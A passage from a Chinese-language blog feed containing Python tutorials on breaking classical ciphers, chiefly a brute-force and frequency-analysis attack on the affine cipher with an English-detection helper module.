class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:<br>word=word.strip()<br>st=decrypt(word,message)<br><br><span class="hljs-comment">#message=message.replace(&quot; &quot;, &quot;&quot;) #清除输入中的空格</span><br><span class="hljs-comment">#print(st)</span><br><span class="hljs-keyword">if</span> detectEnglish.isEnglish(st,wordPercentage=<span class="hljs-number">40</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;密钥可能为%s&quot;</span>%word)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;对应明文可能为%s&quot;</span>%st)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>message=<span class="hljs-string">&#x27;TzxisnzeccjxkgnfqlolmysbbqqIlxcz.&#x27;</span><br>Hack(message.upper())<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h4 id="detectEnglish-py"><a href="#detectEnglish-py" class="headerlink" title="detectEnglish.py"></a>detectEnglish.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Detect English module</span><br><span class="hljs-comment"># http://inventwithpython.com/hacking (BSD Licensed)</span><br><br><span class="hljs-comment"># To use, type this code:</span><br><span class="hljs-comment">#   import detectEnglish</span><br><span class="hljs-comment">#   detectEnglish.isEnglish(someString) # returns True or False</span><br><span class="hljs-comment"># (There must be a &quot;dictionary.txt&quot; file in this directory with all English</span><br><span class="hljs-comment"># words in it, one word per line. You can download this from</span><br><span class="hljs-comment"># http://invpy.com/dictionary.txt)</span><br>UPPERLETTERS = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>LETTERS_AND_SPACE = UPPERLETTERS + UPPERLETTERS.lower() + <span class="hljs-string">&#x27; \t\n&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loadDictionary</span>():<br>    dictionaryFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dictionary.txt&#x27;</span>)<br>    englishWords = &#123;&#125;<br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> dictionaryFile.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>        englishWords[word] = <span class="hljs-literal">None</span><br>    dictionaryFile.close()<br>    <span class="hljs-keyword">return</span> englishWords<br><br>ENGLISH_WORDS = loadDictionary()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getEnglishCount</span>(<span class="hljs-params">message</span>):<br>    message = message.upper()<br>    message = removeNonLetters(message)<br>    possibleWords = message.split()<br><br>    <span class="hljs-keyword">if</span> possibleWords == []:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0.0</span> <span class="hljs-comment"># no words at all, so return 0.0</span><br><br>    matches = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> possibleWords:<br>        <span class="hljs-keyword">if</span> word <span class="hljs-keyword">in</span> ENGLISH_WORDS:<br>            matches += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(matches) / <span class="hljs-built_in">len</span>(possibleWords)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">removeNonLetters</span>(<span class="hljs-params">message</span>):<br>    lettersOnly = []<br>    <span class="hljs-keyword">for</span> symbol <span class="hljs-keyword">in</span> message:<br>        <span class="hljs-keyword">if</span> symbol <span class="hljs-keyword">in</span> LETTERS_AND_SPACE:<br>            lettersOnly.append(symbol)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(lettersOnly)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">isEnglish</span>(<span class="hljs-params">message, wordPercentage=<span class="hljs-number">20</span>, letterPercentage=<span class="hljs-number">85</span></span>):<br>    <span class="hljs-comment"># By default, 20% of the words must exist in the dictionary file, and</span><br>    <span class="hljs-comment"># 85% of all the characters in the message must be letters or spaces</span><br>    <span class="hljs-comment"># (not punctuation or numbers).</span><br>    wordsMatch = getEnglishCount(message) * <span class="hljs-number">100</span> &gt;= wordPercentage<br>    numLetters = <span class="hljs-built_in">len</span>(removeNonLetters(message))<br>    messageLettersPercentage = <span class="hljs-built_in">float</span>(numLetters) / <span class="hljs-built_in">len</span>(message) * <span class="hljs-number">100</span><br>    lettersMatch = messageLettersPercentage &gt;= letterPercentage<br>    <span class="hljs-keyword">return</span> wordsMatch <span class="hljs-keyword">and</span> lettersMatch<br></code></pre></td></tr></table></figure><h4 id="运行结果示例："><a href="#运行结果示例：" class="headerlink" title="运行结果示例："></a>运行结果示例：</h4><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202210031643690.png" alt="image-20221003164334599"></p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学编程之仿射解密</title>
    <link href="/post/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%BC%96%E7%A8%8B%E4%B9%8B%E4%BB%BF%E5%B0%84%E8%A7%A3%E5%AF%86.html"/>
    <url>/post/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%BC%96%E7%A8%8B%E4%B9%8B%E4%BB%BF%E5%B0%84%E8%A7%A3%E5%AF%86.html</url>
    
    <content type="html"><![CDATA[<h1 id="密码学编程之仿射解密"><a href="#密码学编程之仿射解密" class="headerlink" title="密码学编程之仿射解密"></a>密码学编程之仿射解密</h1><h2 id="1-仿射加密"><a href="#1-仿射加密" class="headerlink" title="1.仿射加密"></a>1.仿射加密</h2><p>简单来说就是把密文对应的的数字乘上密钥a再加上b模明文空间长度</p><p>以26位大写字母为密文空间的加密表达式如下：</p><script type="math/tex; mode=display">m=a*c+b(mod26)</script><h2 id="2-破译仿射加密-以26位大写字母为密文空间为例"><a href="#2-破译仿射加密-以26位大写字母为密文空间为例" class="headerlink" title="2.破译仿射加密(以26位大写字母为密文空间为例)"></a>2.破译仿射加密(以26位大写字母为密文空间为例)</h2><p>在已知密钥a和b的情况下可以很容易求出密文</p><p>以26位大写字母为密文空间的解密表达式如下：</p><script type="math/tex; mode=display">c=(m-b)*a^{-1}(mod 26)</script><p>在不知道密钥a和密钥b的情况下由于密钥空间小也很好爆破，因为为了保证能还原明文，必须要能够求出a的逆，这就要求a和26要互素，这样a只有12种可能，b有26种可能，总共12*26-1种可能，非常少，爆破很快。</p><p>但要找出正确的一种可能用肉眼看太麻烦了，可以写一个判断是否是英文的脚本筛选一下，给出一个Al写的脚本detectEnglish.py：(注意需要有一个英文字典txt文件 dictionary.txt)</p><h3 id="detectEnglish-py"><a href="#detectEnglish-py" class="headerlink" title="detectEnglish.py"></a>detectEnglish.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Detect English module</span><br><span class="hljs-comment"># http://inventwithpython.com/hacking (BSD Licensed)</span><br><br><span class="hljs-comment"># To use, type this code:</span><br><span class="hljs-comment">#   import detectEnglish</span><br><span class="hljs-comment">#   detectEnglish.isEnglish(someString) # returns True or False</span><br><span class="hljs-comment"># (There must be a &quot;dictionary.txt&quot; file in this directory with all English</span><br><span class="hljs-comment"># words in it, one word per line. You can download this from</span><br><span class="hljs-comment"># http://invpy.com/dictionary.txt)</span><br>UPPERLETTERS = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>LETTERS_AND_SPACE = UPPERLETTERS + UPPERLETTERS.lower() + <span class="hljs-string">&#x27; \t\n&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loadDictionary</span>():<br>    dictionaryFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dictionary.txt&#x27;</span>)<br>    englishWords = &#123;&#125;<br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> dictionaryFile.read().split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>        englishWords[word] = <span class="hljs-literal">None</span><br>    dictionaryFile.close()<br>    <span class="hljs-keyword">return</span> englishWords<br><br>ENGLISH_WORDS = loadDictionary()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getEnglishCount</span>(<span class="hljs-params">message</span>):<br>    message = message.upper()<br>    message = removeNonLetters(message)<br>    possibleWords = message.split()<br><br>    <span class="hljs-keyword">if</span> possibleWords == []:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0.0</span> <span class="hljs-comment"># no words at all, so return 0.0</span><br><br>    matches = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> possibleWords:<br>        <span class="hljs-keyword">if</span> word <span class="hljs-keyword">in</span> ENGLISH_WORDS:<br>            matches += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(matches) / <span class="hljs-built_in">len</span>(possibleWords)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">removeNonLetters</span>(<span class="hljs-params">message</span>):<br>    lettersOnly = []<br>    <span class="hljs-keyword">for</span> symbol <span class="hljs-keyword">in</span> message:<br>        <span class="hljs-keyword">if</span> symbol <span class="hljs-keyword">in</span> LETTERS_AND_SPACE:<br>            lettersOnly.append(symbol)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(lettersOnly)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">isEnglish</span>(<span class="hljs-params">message, wordPercentage=<span class="hljs-number">20</span>, letterPercentage=<span class="hljs-number">85</span></span>):<br>    <span class="hljs-comment"># By default, 20% of the words must exist in the dictionary file, and</span><br>    <span class="hljs-comment"># 85% of all the characters in the message must be letters or spaces</span><br>    <span class="hljs-comment"># (not punctuation or numbers).</span><br>    wordsMatch = getEnglishCount(message) * <span class="hljs-number">100</span> &gt;= wordPercentage<br>    numLetters = <span class="hljs-built_in">len</span>(removeNonLetters(message))<br>    messageLettersPercentage = <span class="hljs-built_in">float</span>(numLetters) / <span class="hljs-built_in">len</span>(message) * <span class="hljs-number">100</span><br>    lettersMatch = messageLettersPercentage &gt;= letterPercentage<br>    <span class="hljs-keyword">return</span> wordsMatch <span class="hljs-keyword">and</span> lettersMatch<br></code></pre></td></tr></table></figure><p>这个脚本能帮我们淘汰掉很多种情况，但还是不能唯一得出密文，为了更好锁定密文，对于长文本来说可以引入词频分析，确定明文中E的正确位置(仿射加密本质是更简单的单表替换，出现频率最多的字符大概率就是E),帮助更好的判断出正确的明文</p><p>最后的脚本如下(对长密文适用)：</p><h3 id="AffineHack-py"><a href="#AffineHack-py" class="headerlink" title="AffineHack.py"></a>AffineHack.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Affine Cipher Hacker</span><br><span class="hljs-keyword">import</span> math,sys,detectEnglish,wordninja<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><br>englishLetterFrea=&#123;<span class="hljs-string">&#x27;E&#x27;</span>:<span class="hljs-number">12.7</span>,<span class="hljs-string">&#x27;T&#x27;</span>:<span class="hljs-number">9.06</span>,<span class="hljs-string">&#x27;A&#x27;</span>:<span class="hljs-number">8.17</span>,<span class="hljs-string">&#x27;O&#x27;</span>:<span class="hljs-number">7.51</span>,<span class="hljs-string">&#x27;I&#x27;</span>:<span class="hljs-number">6.97</span>,<span class="hljs-string">&#x27;N&#x27;</span>:<span class="hljs-number">6.75</span>,<span class="hljs-string">&#x27;S&#x27;</span>:<span class="hljs-number">6.33</span>,<span class="hljs-string">&#x27;H&#x27;</span>:<span class="hljs-number">6.09</span>,<span class="hljs-string">&#x27;R&#x27;</span>:<span class="hljs-number">5.99</span>,<span class="hljs-string">&#x27;D&#x27;</span>:<span class="hljs-number">4.25</span>,<span class="hljs-string">&#x27;L&#x27;</span>:<span class="hljs-number">4.03</span>,<span class="hljs-string">&#x27;C&#x27;</span>:<span class="hljs-number">2.78</span>,<span class="hljs-string">&#x27;U&#x27;</span>:<span class="hljs-number">2.76</span>,<span class="hljs-string">&#x27;M&#x27;</span>:<span class="hljs-number">2.41</span>,<span class="hljs-string">&#x27;W&#x27;</span>:<span class="hljs-number">2.36</span>,<span class="hljs-string">&#x27;F&#x27;</span>:<span class="hljs-number">2.23</span>,<span class="hljs-string">&#x27;G&#x27;</span>:<span class="hljs-number">2.02</span>,<span class="hljs-string">&#x27;Y&#x27;</span>:<span class="hljs-number">1.97</span>,<span class="hljs-string">&#x27;P&#x27;</span>:<span class="hljs-number">1.93</span>,<span class="hljs-string">&#x27;B&#x27;</span>:<span class="hljs-number">1.29</span>,<span class="hljs-string">&#x27;V&#x27;</span>:<span class="hljs-number">0.98</span>,<span class="hljs-string">&#x27;K&#x27;</span>:<span class="hljs-number">0.77</span>,<span class="hljs-string">&#x27;J&#x27;</span>:<span class="hljs-number">0.15</span>,<span class="hljs-string">&#x27;X&#x27;</span>:<span class="hljs-number">0.15</span>,<span class="hljs-string">&#x27;Q&#x27;</span>:<span class="hljs-number">0.10</span>,<span class="hljs-string">&#x27;Z&#x27;</span>:<span class="hljs-number">0.07</span>&#125;<br><br><br>ETAOIN=<span class="hljs-string">&#x27;ETAOINSHRDLCUMWFGYPBVKJXQZ&#x27;</span>  <span class="hljs-comment">#英文中词频排列顺序（降序）</span><br><br>Symbols=<span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>  <span class="hljs-comment">#明文空间 密文空间</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLetterCount</span>(<span class="hljs-params">message</span>):<br><br><span class="hljs-comment">#统计字符串中每个字母的数量</span><br>LetterCount=&#123;<span class="hljs-string">&#x27;A&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;B&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;C&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;D&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;E&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;F&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;G&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;H&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;I&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;J&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;K&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;L&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;M&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;N&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;O&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;P&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;Q&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;R&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;S&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;T&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;U&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;V&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;W&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;X&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;Y&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;Z&#x27;</span>:<span class="hljs-number">0</span>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> message.upper():<br><span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> Symbols:<br>LetterCount[i]+=<span class="hljs-number">1</span><br><br><span class="hljs-keyword">return</span> LetterCount<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getItemAtIndexZero</span>(<span class="hljs-params">x</span>):<br><span class="hljs-comment">#返回变量的下标为0的值</span><br><span class="hljs-keyword">return</span> x[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getFrequencyOrder</span>(<span class="hljs-params">message</span>):<br><span class="hljs-comment">#按照字母出现的次数排序</span><br>letterToFreq=getLetterCount(message) <span class="hljs-comment">#字母到次数的映射</span><br>freqToLetter=&#123;&#125; <span class="hljs-comment">#次数到字母的映射</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Symbols:          <br><span class="hljs-keyword">if</span> letterToFreq[i] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> freqToLetter:   <span class="hljs-comment">#判断字母对应次数是否是字典freqToLetter的键，若不是则以该次数为键，以对于的字母为值；若是，则在最后追加一组键值对</span><br>freqToLetter[letterToFreq[i]]=[i]     <span class="hljs-comment">#因为次数可能出现相同的情况</span><br><span class="hljs-keyword">else</span>:<br>freqToLetter[letterToFreq[i]].append(i)<br><br><span class="hljs-keyword">for</span> freq <span class="hljs-keyword">in</span> freqToLetter:<br>freqToLetter[freq].sort(key=ETAOIN.find,reverse=<span class="hljs-literal">True</span>)  <span class="hljs-comment">#将同一次数的键所对应的字母按照ETAOIN的降序排列(做一个约定)</span><br>freqToLetter[freq]=<span class="hljs-string">&#x27;&#x27;</span>.join(freqToLetter[freq])<br><br>freqPairs=<span class="hljs-built_in">list</span>(freqToLetter.items())                 <span class="hljs-comment">#将字典变成一个元组列表</span><br>freqPairs.sort(key=getItemAtIndexZero,reverse=<span class="hljs-literal">True</span>)  <span class="hljs-comment">#按照元组列表索引为0的值排序</span><br><br><span class="hljs-keyword">return</span> freqPairs<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getKey</span>(<span class="hljs-params">key</span>):<br><span class="hljs-comment">#得到两个ab密钥</span><br>key_a=key//<span class="hljs-built_in">len</span>(Symbols)<br>key_b=key%<span class="hljs-built_in">len</span>(Symbols)<br><span class="hljs-keyword">return</span> (key_a,key_b)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkKeys</span>(<span class="hljs-params">key_a,key_b,mode</span>):<br><span class="hljs-comment">#检查密钥是否合法</span><br><span class="hljs-keyword">if</span> mode==<span class="hljs-string">&#x27;encrypt&#x27;</span>:<br><span class="hljs-keyword">if</span> key_a==<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> key_b==<span class="hljs-number">1</span>:<br>sys.exit(<span class="hljs-string">&#x27;太简单&#x27;</span>)<br><span class="hljs-keyword">if</span> key_a&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> key_b&lt;<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> key_b&gt;<span class="hljs-built_in">len</span>(Symbols)-<span class="hljs-number">1</span>:<br>sys.exit(<span class="hljs-string">&#x27;不属于区间(0,len(Symbols))&#x27;</span>)<br><span class="hljs-keyword">if</span> math.gcd(key_a,<span class="hljs-built_in">len</span>(Symbols))!=<span class="hljs-number">1</span>:<br>sys.exit(<span class="hljs-string">&#x27;密钥a和模数不互素&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decryptM</span>(<span class="hljs-params">key,message</span>):<br><span class="hljs-comment">#已知密钥的仿射解密</span><br>K1,K2=getKey(key)<br>checkKeys(K1,K2,<span class="hljs-string">&#x27;decrypt&#x27;</span>)<br>result=<span class="hljs-string">&#x27;&#x27;</span><br>modInverseOfKeya=invert(K1,<span class="hljs-built_in">len</span>(Symbols))    <span class="hljs-comment">#求密钥a的模逆元</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> message:<br><span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> Symbols:<br>Index=Symbols.find(i)<br>result+=Symbols[((Index-K2)*modInverseOfKeya)%<span class="hljs-built_in">len</span>(Symbols)]<br><span class="hljs-keyword">else</span>:<br>result+=i<br><br><span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hackAffine</span>(<span class="hljs-params">message</span>):  <br><span class="hljs-comment">#爆破得到明文</span><br>cnt=<span class="hljs-number">0</span> <span class="hljs-comment">#最后输出的可能解密结果数</span><br><br>Max=getFrequencyOrder(message)[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> message:<br><span class="hljs-keyword">if</span> i==Max:<br>ind = message.find(i)   <span class="hljs-comment">#找到E所在的位置</span><br><span class="hljs-keyword">break</span><br><span class="hljs-comment">#                  </span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hacking start&#x27;</span>)<br><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(Symbols)**<span class="hljs-number">2</span>):   <span class="hljs-comment">#爆破密钥</span><br>key_a=getKey(key)[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">if</span> math.gcd(key_a,<span class="hljs-built_in">len</span>(Symbols))!=<span class="hljs-number">1</span>:  <span class="hljs-comment">#密钥a要和模数互素</span><br><span class="hljs-keyword">continue</span><br><br>result=decryptM(key,message)  <span class="hljs-comment">#将密钥带入根据公式求出对应明文</span><br><br><span class="hljs-keyword">if</span> result[ind]==<span class="hljs-string">&#x27;E&#x27;</span>:<br><span class="hljs-comment">#print(&#x27;tried key %s...(%s)&#x27;%(key,result[:20]))</span><br>text=<span class="hljs-string">&#x27; &#x27;</span>.join(wordninja.split(result))  <span class="hljs-comment">#利用wordninja工具给字符串分词，这样才能用detectEnglish判断是否是英文</span><br><span class="hljs-keyword">if</span> detectEnglish.isEnglish(text):    <span class="hljs-comment">#利用detectEnglish判断是否是英文</span><br>cnt+=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;possible encryption hack:&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;key:%s&#x27;</span>%(key))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c:&#x27;</span>+result[:<span class="hljs-number">50</span>])<br><span class="hljs-built_in">print</span>(text)                      <span class="hljs-comment">#输出最后可能结果</span><br><span class="hljs-keyword">return</span> cnt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>Message=<span class="hljs-string">&#x27;FMXVEDKAPHFERBNDKRXRSREFMORUDSDKDVSHVUFEDKAPRKDLYEVLRHHRH&#x27;</span>  <span class="hljs-comment"># 输入密文</span><br><br>HackedM=hackAffine(Message)<br><br><span class="hljs-keyword">if</span> HackedM!=<span class="hljs-number">0</span>:           <span class="hljs-comment">#如果最后测得的可能解不为0，则成功解密</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Success&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Failed&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br><br></code></pre></td></tr></table></figure><h2 id="3-运行示例"><a href="#3-运行示例" class="headerlink" title="3.运行示例"></a>3.运行示例</h2><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202209241141751.png" alt="image-20220924114055620"></p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>typora+picgo+github图床搭建</title>
    <link href="/post/typora-picgo-github%E5%9B%BE%E5%BA%8A%E6%90%AD%E5%BB%BA.html"/>
    <url>/post/typora-picgo-github%E5%9B%BE%E5%BA%8A%E6%90%AD%E5%BB%BA.html</url>
    
